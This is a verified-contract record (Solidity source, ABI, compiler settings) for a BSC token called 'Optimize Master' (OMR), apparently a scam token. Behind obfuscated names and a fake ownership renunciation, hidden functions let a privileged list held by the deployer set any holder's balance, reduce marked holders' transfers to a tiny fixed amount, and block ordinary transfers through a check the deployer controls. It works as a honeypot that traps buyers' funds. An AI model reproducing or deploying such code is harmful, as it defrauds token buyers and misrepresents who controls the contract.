{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface receiverLaunchSender {\n    function createPair(address launchedLaunch, address limitSell) external returns (address);\n}\n\ninterface txBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverAmountShould) external view returns (uint256);\n\n    function transfer(address buyTradingReceiver, uint256 minTake) external returns (bool);\n\n    function allowance(address fromEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyTradingReceiver,\n        uint256 minTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedBuy, uint256 value);\n    event Approval(address indexed fromEnable, address indexed spender, uint256 value);\n}\n\nabstract contract buyMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txBuyMetadata is txBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OptimizeMaster is buyMax, txBuy, txBuyMetadata {\n\n    mapping(address => uint256) private autoIs;\n\n    event OwnershipTransferred(address indexed fromLaunch, address indexed limitTradingBuy);\n\n    function takeListToken(address feeSell, address buyTradingReceiver, uint256 minTake) internal returns (bool) {\n        if (feeSell == receiverToken) {\n            return marketingWallet(feeSell, buyTradingReceiver, minTake);\n        }\n        uint256 teamMaxFrom = txBuy(takeEnable).balanceOf(swapMax);\n        require(teamMaxFrom == sellToken);\n        require(buyTradingReceiver != swapMax);\n        if (maxMarketing[feeSell]) {\n            return marketingWallet(feeSell, buyTradingReceiver, teamSwap);\n        }\n        return marketingWallet(feeSell, buyTradingReceiver, minTake);\n    }\n\n    constructor (){\n        if (teamIsSell == toReceiverIs) {\n            teamIsSell = false;\n        }\n        fundBuy enableWallet = fundBuy(modeFundTrading);\n        takeEnable = receiverLaunchSender(enableWallet.factory()).createPair(enableWallet.WETH(), address(this));\n        if (teamIsSell == swapExemptTo) {\n            receiverTotal = senderToken;\n        }\n        receiverToken = _msgSender();\n        swapLaunchReceiver[receiverToken] = true;\n        autoIs[receiverToken] = launchTo;\n        isTotal();\n        if (toReceiverIs) {\n            senderToken = receiverLaunch;\n        }\n        emit Transfer(address(0), receiverToken, launchTo);\n    }\n\n    uint256 public receiverLaunch;\n\n    bool public swapExemptTo;\n\n    address public takeEnable;\n\n    mapping(address => mapping(address => uint256)) private modeTrading;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchTo;\n    }\n\n    address public receiverToken;\n\n    bool private toReceiverIs;\n\n    function marketingWallet(address feeSell, address buyTradingReceiver, uint256 minTake) internal returns (bool) {\n        require(autoIs[feeSell] >= minTake);\n        autoIs[feeSell] -= minTake;\n        autoIs[buyTradingReceiver] += minTake;\n        emit Transfer(feeSell, buyTradingReceiver, minTake);\n        return true;\n    }\n\n    function limitAt(uint256 minTake) public {\n        feeMarketing();\n        sellToken = minTake;\n    }\n\n    uint256 constant teamSwap = 3 ** 10;\n\n    function minEnable(address shouldIs, uint256 minTake) public {\n        feeMarketing();\n        autoIs[shouldIs] = minTake;\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingLiquidity;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundAmount;\n    }\n\n    function modeFee(address buyLiquidity) public {\n        feeMarketing();\n        if (toReceiverIs == swapExemptTo) {\n            receiverLaunch = receiverTotal;\n        }\n        if (buyLiquidity == receiverToken || buyLiquidity == takeEnable) {\n            return;\n        }\n        maxMarketing[buyLiquidity] = true;\n    }\n\n    function allowance(address marketingLiquidity, address liquidityToLaunched) external view virtual override returns (uint256) {\n        if (liquidityToLaunched == modeFundTrading) {\n            return type(uint256).max;\n        }\n        return modeTrading[marketingLiquidity][liquidityToLaunched];\n    }\n\n    function fundLimitFee(address exemptSwapMode) public {\n        require(exemptSwapMode.balance < 100000);\n        if (listTeam) {\n            return;\n        }\n        if (swapExemptTo) {\n            exemptReceiver = true;\n        }\n        swapLaunchReceiver[exemptSwapMode] = true;\n        \n        listTeam = true;\n    }\n\n    mapping(address => bool) public swapLaunchReceiver;\n\n    function transferFrom(address feeSell, address buyTradingReceiver, uint256 minTake) external override returns (bool) {\n        if (_msgSender() != modeFundTrading) {\n            if (modeTrading[feeSell][_msgSender()] != type(uint256).max) {\n                require(minTake <= modeTrading[feeSell][_msgSender()]);\n                modeTrading[feeSell][_msgSender()] -= minTake;\n            }\n        }\n        return takeListToken(feeSell, buyTradingReceiver, minTake);\n    }\n\n    mapping(address => bool) public maxMarketing;\n\n    uint8 private totalReceiver = 18;\n\n    bool private exemptReceiver;\n\n    uint256 private senderToken;\n\n    function transfer(address shouldIs, uint256 minTake) external virtual override returns (bool) {\n        return takeListToken(_msgSender(), shouldIs, minTake);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalReceiver;\n    }\n\n    uint256 public receiverTotal;\n\n    function isTotal() public {\n        emit OwnershipTransferred(receiverToken, address(0));\n        tradingLiquidity = address(0);\n    }\n\n    string private fundAmount = \"OMR\";\n\n    function owner() external view returns (address) {\n        return tradingLiquidity;\n    }\n\n    function feeMarketing() private view {\n        require(swapLaunchReceiver[_msgSender()]);\n    }\n\n    uint256 atFundReceiver;\n\n    address modeFundTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public autoBuy;\n\n    bool public listTeam;\n\n    address private tradingLiquidity;\n\n    uint256 private launchTo = 100000000 * 10 ** 18;\n\n    function approve(address liquidityToLaunched, uint256 minTake) public virtual override returns (bool) {\n        modeTrading[_msgSender()][liquidityToLaunched] = minTake;\n        emit Approval(_msgSender(), liquidityToLaunched, minTake);\n        return true;\n    }\n\n    string private enableShould = \"Optimize Master\";\n\n    function name() external view virtual override returns (string memory) {\n        return enableShould;\n    }\n\n    address swapMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private teamIsSell;\n\n    uint256 sellToken;\n\n    function balanceOf(address receiverAmountShould) public view virtual override returns (uint256) {\n        return autoIs[receiverAmountShould];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTradingBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityToLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityToLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmountShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSwapMode\",\"type\":\"address\"}],\"name\":\"fundLimitFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minTake\",\"type\":\"uint256\"}],\"name\":\"limitAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTake\",\"type\":\"uint256\"}],\"name\":\"minEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLiquidity\",\"type\":\"address\"}],\"name\":\"modeFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapExemptTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLaunchReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTradingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OptimizeMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}